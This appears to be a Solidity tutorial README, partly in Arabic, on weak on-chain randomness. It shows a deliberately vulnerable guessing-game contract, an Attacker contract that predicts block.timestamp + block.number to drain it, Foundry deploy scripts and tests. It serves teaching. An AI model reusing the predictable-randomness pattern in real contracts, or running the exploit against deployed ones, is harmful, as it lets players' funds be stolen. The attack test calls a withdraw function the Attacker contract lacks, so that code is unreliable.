# Randomness-attack- 
## 1- What is Randomness?
run same code get diffirent result

## 2- what is Determinisitic System?
   * Same Input == Same Outbut
   * every node must agree on the same state
    
  ```solidity
 function test(uint256 a) public pure returns(uint256){
      return a*2;
   }          // same input same output
   
```
 ![Image](https://github.com/user-attachments/assets/266e1bd8-ba9d-4746-a793-4fb934ed254b)


## 3- why we need randomness in web3
   * Games NFT (Non Fungible Tokens  ) [ERC721](https://docs.openzeppelin.com/contracts/3.x/erc721)  Choose Winner
   * 🏛️ DAO = Decentralized Autonomous Organization choose Member to Voting
   * AirDrops
   * Validatores , committes , nodes  proof of stake (ethereum2, polkadot ,Algorand)
   * Defi Decentralized Finance
     
# Example 01
Smart contract Game to guess number and win the game

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Game {
    constructor() payable{

    }

    function play(uint256 guess) external{
        uint256 randomNumber = block.timestamp + block.number; 

        if(randomNumber == guess){
           payable(msg.sender). transfer(address(this).balance);        
        }
    }

}
```
Command to compile
```
forge compile
```
Command to deploy on sepolia
```
 forge create <contract path> --rpc-url <sepolia rpc>  --private-key <your private key> --value <charge contract with ethereum> --broadcast
```
# 🔌 Who Provides RPC Endpoints?

There are several popular providers that offer reliable RPC endpoints for interacting with blockchain networks:

- [Infura](https://infura.io)
- [Alchemy](https://www.alchemy.com)
- [Ankr](https://www.ankr.com)
- [QuickNode](https://www.quicknode.com)

Alternatively, you can run your own Ethereum node (e.g., using Geth or Nethermind) and host your own RPC endpoint for full control and privacy.


Command to check Balance
```
cast balance 0xYourContractAddress --rpc-url <your rpc>
```
convert from wei to ether

```
cast from-wei 1000000000000000000

```

# Scritp to deploy Game Contract 
```solidity
//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/Game.sol";

contract DeployGame is Script {
    function run() external{

        vm.startBroadcast() ;

       Game game = new Game{value: 0.01 ether}();
 


        vm.stopBroadcast ();

    }
}
```
> ❗ **تنبيه مهم (في حالتك):**  
> طالما عقد `Game` عنده constructor عليه `payable`، يعني محتاج تديله فلوس وقت النشر، يبقى لازم تكتب السطر كده:
>
> ```solidity
> Game game = new Game{value: 0.01 ether}();
> ```
>
> عشان تبعتله `0.01 ETH` وقت النشر.

> 💡 **ملاحظة إضافية:**  
> لو انت بتدفع `value` وقت النشر (عشان العقد بياخد فلوس في الـ `constructor`)، لازم تكتبها جوه `new Game{value: ...}` جوه السكريبت:
>
> ```solidity
> Game game = new Game{value: 0.01 ether}();
> ```
>
> مش هينفع تعتمد بس على `--value` من CLI، لازم الاتنين مع بعض.
ركز إن --broadcast لازم يكون قبل --value.




## Smart contract to attack the Game

```solidity

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IGame{
        function play(uint256 guess) external;
    }

contract Attacker{
    IGame public game;  //store Games Address

    constructor(address GameContract) payable{
        game = IGame(GameContract);

    }

    function attack() external payable{
        uint predictNumber = block.timestamp + block.number;
        game.play(predictNumber);
    }
    receive() external payable {}

}
```
Command to compile
```
forge compile <contract path>
```
Command to deploy on sepolia
```
 forge create <contract path> --rpc-url <sepolia rpc>  --private-key <your private key>  --broadcast
```
Command to call function play

```
 cast send <contract address>  --rpc-url <your rpc> --private-key <your private key >   '<function name>'
```

Command to check Balance
```
cast balance 0xYourContractAddress --rpc-url <your rpc>
```
## script to deploy Attacker contract 

```solidity

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "src/Attacker.sol";
contract DeployAttacker is Script{

    
    function run() external{

        vm.startBroadcast();

        Attacker attacker = new Attacker{value : 0}(0xC1685e8D090D914112afaadD29Ec5A7eB4185957);


        vm.stopBroadcast();
    }
}
```
# write test in foundry

```solidity
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/Game.sol";

contract GameTest is Test {
    Game game;
    address player = address(0x123);
    address anotherPlayer = address(0x456);
    uint256 initialBalance = 1 ether;

    // Set up the test environment
    function setUp() public {
        // Deploy the Game contract with 1 ETH
        game = new Game{value: initialBalance}();
        // Fund players with ETH
        vm.deal(player, 1 ether);
        vm.deal(anotherPlayer, 1 ether);
    }

    // Test successful guess (correct number)
    function testPlayCorrectGuess() public {
        // Calculate the expected "random" number
        uint256 correctGuess = block.timestamp + block.number;

        // Simulate player calling play
        vm.prank(player);
        game.play(correctGuess);

        // Verify player received the contract's balance
        assertEq(player.balance, 1 ether + initialBalance, "Player should receive contract balance");
        // Verify contract balance is now 0
        assertEq(address(game).balance, 0, "Contract balance should be 0");
    }

    // Test failed guess (incorrect number)
    function testPlayIncorrectGuess() public {
        // Calculate an incorrect guess
        uint256 incorrectGuess = block.timestamp + block.number + 1;

        // Simulate player calling play
        vm.prank(player);
        game.play(incorrectGuess);

        // Verify player's balance is unchanged
        assertEq(player.balance, 1 ether, "Player balance should not change");
        // Verify contract balance is unchanged
        assertEq(address(game).balance, initialBalance, "Contract balance should remain unchanged");
    }

    // Test playing with zero contractseca balance
    function testPlayWithZeroBalance() public {
        // Deploy a new Game contract with 0 ETH
        Game emptyGame = new Game();
        uint256 correctGuess = block.timestamp + block.number;

        // Simulate player calling play
        vm.prank(player);
        emptyGame.play(correctGuess);

        // Verify player's balance is unchanged (no ETH to win)
        assertEq(player.balance, 1 ether, "Player balance should not change");
        // Verify contract balance is still 0
        assertEq(address(emptyGame).balance, 0, "Contract balance should be 0");
    }

    // Test multiple guesses in the same block
    function testMultipleGuessesSameBlock() public {
        // Calculate the correct guess
        uint256 correctGuess = block.timestamp + block.number;

        // First player wins
        vm.prank(player);
        game.play(correctGuess);

        // Verify contract is empty
        assertEq(address(game).balance, 0, "Contract balance should be 0 after first win");

        // Second player tries to play in the same block
        vm.prank(anotherPlayer);
        game.play(correctGuess);

        // Verify second player's balance is unchanged
        assertEq(anotherPlayer.balance, 1 ether, "Second player balance should not change");
    }

    // Test that the contract accepts ETH in constructor
    function testConstructorReceivesETH() public {
        // Verify initial balance set in setUp
        assertEq(address(game).balance, initialBalance, "Contract should have initial balance");
    }
}
```
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/Game.sol";

contract GameTest is Test {
    Game game;
    address player1 = address(1);
    address player2 = address(2);
    uint256 initialBalance = 1 ether;

    function setUp() public {
        // Deploy the game contract with initial ether balance
        vm.deal(address(this), initialBalance);
        game = new Game{value: initialBalance}();
    }

    function testInitialBalance() public {
        assertEq(address(game).balance, initialBalance);
    }

    function testCorrectGuessWins() public {
        // Fund player1
        vm.deal(player1, 1 ether);
        
        // Predict the random number (which is block.timestamp + block.number)
        uint256 correctGuess = block.timestamp + block.number;
        
        // Player1 makes the correct guess
        vm.prank(player1);
        game.play(correctGuess);
        
        // Player1 should receive the contract balance
        assertEq(player1.balance, initialBalance + 1 ether);
        assertEq(address(game).balance, 0);
    }

    function testIncorrectGuessLoses() public {
        // Fund player2
        vm.deal(player2, 1 ether);
        
        // Player2 makes an incorrect guess
        vm.prank(player2);
        game.play(12345); // Obviously wrong
        
        // Contract balance should remain unchanged
        assertEq(address(game).balance, initialBalance);
        assertEq(player2.balance, 1 ether); // No change
    }

    function testCannotWinWithWrongGuess() public {
        // Fund player1
        vm.deal(player1, 1 ether);
        
        // Record logs
        vm.recordLogs();
        
        // Player1 makes wrong guess
        vm.prank(player1);
        game.play(block.timestamp + block.number + 1); // Off by one
        
        // Check that no transfer occurred
        Vm.Log[] memory entries = vm.getRecordedLogs();
        assertEq(entries.length, 0);
        assertEq(address(game).balance, initialBalance);
    }

    function testMultipleAttempts() public {
        // Fund both players
        vm.deal(player1, 1 ether);
        vm.deal(player2, 1 ether);
        
        // First player fails
        vm.prank(player1);
        game.play(123);
        
        // Second player succeeds
        uint256 correctGuess = block.timestamp + block.number;
        vm.prank(player2);
        game.play(correctGuess);
        
        // Check balances
        assertEq(player1.balance, 1 ether); // No change
        assertEq(player2.balance, initialBalance + 1 ether); // Won the prize
        assertEq(address(game).balance, 0);
    }

    function testCannotWinAfterPrizeClaimed() public {
        // First player wins
        uint256 correctGuess = block.timestamp + block.number;
        vm.prank(player1);
        game.play(correctGuess);
        
        // Contract should be empty now
        assertEq(address(game).balance, 0);
        
        // Second player tries to win but contract has no funds
        vm.deal(player2, 1 ether);
        vm.prank(player2);
        game.play(correctGuess);
        
        // No change in balances
        assertEq(player2.balance, 1 ether);
        assertEq(address(game).balance, 0);
    }
}
```


# test for attack
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/Game.sol";
import "../src/Attacker.sol";

contract AttackTest is Test {
    Game public game;
    Attacker public attacker;

    address deployer = address(0xDEAD);
    address attackerEOA = address(0xBEEF);

    function setUp() public {
        vm.deal(deployer, 1 ether);
        vm.deal(attackerEOA, 1 ether);

        // deploy Game contract with some balance
        vm.startPrank(deployer);
        game = new Game{value: 1 ether}();
        vm.stopPrank();

        // deploy attacker contract
        vm.startPrank(attackerEOA);
        attacker = new Attacker(address(game));
        vm.stopPrank();
    }

    function testAttackSucceeds() public {
       

        // run attack from attackerEOA
        vm.prank(attackerEOA);
        attacker.attack();

        // verify attacker contract got the ether
        assertEq(address(game).balance, 0);

        // withdraw back to EOA
          vm.prank(attackerEOA);
          attacker.withdraw();

        assertEq(address(attackerEOA).balance, 2 ether);


        
    }
}
```




   

